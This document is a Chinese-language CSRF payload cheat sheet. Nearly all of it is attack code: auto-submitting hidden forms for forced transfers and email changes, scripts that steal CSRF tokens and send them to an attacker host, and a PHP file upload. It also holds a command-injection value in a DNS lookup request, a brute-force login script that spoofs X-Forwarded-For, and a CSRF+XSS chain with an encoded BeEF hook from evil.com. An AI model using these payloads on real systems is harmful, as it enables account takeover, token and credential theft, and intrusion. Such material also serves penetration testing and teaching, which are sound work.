# CSRF

## 1.HTML标签

```javascript
<iframe src="目标站点地址"></iframe>
<script src="目标站点地址"></script>
<img src="目标站点地址" alt="">
<embed src="目标站点地址">
<audio src="目标站点地址">
<video src="目标站点地址">
<source src="目标站点地址" type="...">
<video poster="目标站点地址">
<link rel="stylesheet" href="目标站点地址">
<object data="目标站点地址">
<body background="目标站点地址">
<div style="background: url('目标站点地址');"></div>
<bgsound src="目标站点地址">
<track src="目标站点地址" kind="subtitles">
<input type="image" src="目标站点地址" alt="Submit Button">

<style>
  body { background: url('目标站点地址'); }
</style>
```

img.html：
```html
<img src="http://目标站点/" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```

## 2.GET请求

img
```javascript
<img src="http://www.examplebank.com/transfer?amount=1000&toAccount=attacker's-account-number" width="1" height="1" style="visibility:hidden;">
```

a
```javascript
<a href="http://www.examplebank.com/transfer?amount=1000&toAccount=attacker's-account-number">点击有惊喜!</a>
```

表单
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="GET" action="https://ghostwolflab/email/change-email">
      <input type="hidden" name="email" value="test@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## 3.POST请求

有交互
```html
<html>
<body>
<form action="http://目标站点/mutillidae/index.php?page=register.php" method="POST">
<input type="hidden" name="username" value="ghostwolf">
<input type="hidden" name="password" value="123qwe">
<input type="hidden" name="confirm_password" value="123qwe">
<input type="hidden" name="my_signature" value="hello">
<input type="hidden" name="register-php-submit-button" value="Create Account">
<input type="submit" value="Click Me!!!">
</form>
</body>
<html>
```

无交互
```html
<html>
<body>
<form action=http://目标站点/mutillidae/index.php?page=register.php method="POST" style="display: none;" id="csfr-form"> >
<input type="hidden" name="username" value="ghostwolf">
<input type="hidden" name="password" value="123qwe">
<input type="hidden" name="confirm_password" value="123qwe">
<input type="hidden" name="my_signature" value="hello">
<input type="hidden" name="register-php-submit-button" value="Create Account">
</form>
<script>
  document.getElementById('csfr-form').submit();
</script>
</body>
<html>
```

iframe
```html
<html>
  <body>
  <iframe style="display:none" name="csrfframe"></iframe>
    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
      <input type="hidden" name="email" value="test@email.com" autofocus onfocus="csrfform.submit();" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

多部分表单数据提交
```html
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
    method: "post",
    body: myFormData,
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    mode: "no-cors"
});
```

```html
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

xhr.sendAsBinary(body);
```

## 4.Ajax请求

```javascript
<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
<script>
$.ajax({
  url:'http://目标站点/mutillidae/index.php?page=dns-lookup.php',
  type:'POST',
  ContentType:'application/x-www-form-urlencoded',
  data:'target_host=8.8.8.8;pwd&dns-lookup-php-submit-button=Lookup DNS'});
</script>
```

POST请求

```javascript
<script>
var xh;
if (window.XMLHttpRequest)
  {
  xh=new XMLHttpRequest();
  }
else
  {
  xh=new ActiveXObject("Microsoft.XMLHTTP");
  }
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xh.send("username=abcd&status=on");
</script>

<script>
$.ajax({
  type: "POST",
  url: "https://google.com",
  data: "param=value&param2=value2"
})
</script>
```

## 5.提取CSRF令牌

提取CSRF令牌
```javascript
<script type="text/javascript">
    var csrfToken = document.getElementsByName("csrf_token")[0].value;
    //假设CSRF令牌位于csrf_token的字段中
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://攻击者主机/csrf", true);
    xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhttp.send("token=" + csrfToken);
</script>
```

使用被盗的CSRF令牌发起攻击
```javascript
<form action="http://目标站点/" method="POST" id="malicious-form" style="display:none;">
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="account" value="attacker_account" />
  <input type="hidden" name="csrf_token" value="窃取的CSRF令牌" />
</form>

<script>document.getElementById('malicious-form').submit();</script>
```

---

窃取CSRF令牌并发送POST请求
```javascript
function submitFormWithTokenJS(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", POST_URL, true);
    xhr.withCredentials = true;
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            //console.log(xhr.responseText);
        }
    }

    xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    xhr.withCredentials = true;
    xhr.open("GET", GET_URL, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            page = xhr.response
            input = page.getElementById("token");
            //查看令牌
            //console.log("The token is: " + input.value);
            submitFormWithTokenJS(input.value);
        }
    };
    xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```

---

窃取CSRF令牌并使用iframe、form和Ajax发送POST请求
```javascript
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
    x1=document.getElementById("i1");
    x1d=(x1.contentWindow||x1.contentDocument);
    t=x1d.document.getElementById("token").value;

    document.getElementById("token").value=t;
    document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```

---

窃取CSRF令牌并使用ifram和form发送POST请求
```javascript
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
    var name = 'admin2';
    var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
    document.writeln('<form width="0" height="0" method="post" action="http://攻击者主机/check.php"  enctype="multipart/form-data">');
    document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
    document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
    document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
    document.writeln('</form>');
    document.forms[0].submit.click();
}
</script>
```

---

窃取CSRF令牌并使用2个iframe发送
```javascript
<script>
var token;
function readframe1(){
  token = frame1.document.getElementById("profile").token.value;
  document.getElementById("bypass").token.value = token
  loadframe2();
}
function loadframe2(){
  var test = document.getElementbyId("frame2");
  test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
  <input type="text" name="username" value="z">
  <input type="checkbox" name="status" checked="">        
  <input id="token" type="hidden" name="token" value="0000" />
  <button type="submit">Submit</button>
</form>
```

---

使用Ajax窃取CSRF令牌并发送表单
```javascript
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="username" value="root"/>
  <input type="hidden" name="status" value="on"/>
  <input type="hidden" id="findtoken" name="token" value=""/>
  <input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
  x.withCredentials = true;
  x.open("GET","http://google.com?param=VALUE",true);
  x.send(null);
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
    var token = x.responseText.match(/name="token" value="(.+)"/)[1];
    document.getElementById("findtoken").value = token;
    document.getElementById("form").submit();
  }
}
</script>
```

## 其它

Socket.io
```javascript
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
    console.log('connected!');
    socket.emit('join', {
        room: username
    });
  socket.emit('my_room_event', {
      data: '!flag',
      room: username
  })

});
</script>
```

使用CSRF令牌强制登录表单
```javascript
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
    #Return CSRF + Session (cookie)
    r = requests.get(URL)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
    csrf = csrf.group(1)
    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
    return csrf, session_cookie

def login(user, password):
    print(f"{user}:{password}")
    csrf, cookie = init_session()
    cookies = {SESSION_COOKIE_NAME: cookie}
    data = {
        "tokenCSRF": csrf,
        "username": user,
        "password": password,
        "save": ""
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
    if "Username or password incorrect" in r.text:
        return False
    else:
        print(f"FOUND {user} : {password}")
        return True

with open(PASS_LIST, "r") as f:
    for line in f:
        login(USER, line.strip())
```

CSRF + XSS
```javascript
<html>
  <body>
    <p>Please wait... ;)</p>
    <script>
let host = 'http://目标站点'
let beef_payload = '%3c%73%63%72%69%70%74%3e%20%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%3b%20%73%2e%74%79%70%65%3d%27%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%27%3b%20%73%2e%73%72%63%3d%27%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3b%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%27%68%65%61%64%27%29%5b%30%5d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29%3b%20%3c%2f%73%63%72%69%70%74%3e'
let alert_payload = '%3Cimg%2Fsrc%2Fonerror%3Dalert(1)%3E'

function submitRequest() {
  var req = new XMLHttpRequest();
  req.open(<CSRF components, which can easily be copied from Burp's POC generator>);
  req.setRequestHeader("Accept", "*\/*");
  req.withCredentials = true;
  req.onreadystatechange = function () {
    if (req.readyState === 4) {
      executeXSS();
    }
  }
  req.send();
}

function executeXSS() {
  window.location.assign(host+'<URI with XSS>'+alert_payload);
}

submitRequest();
    </script>
  </body>
</html>
```
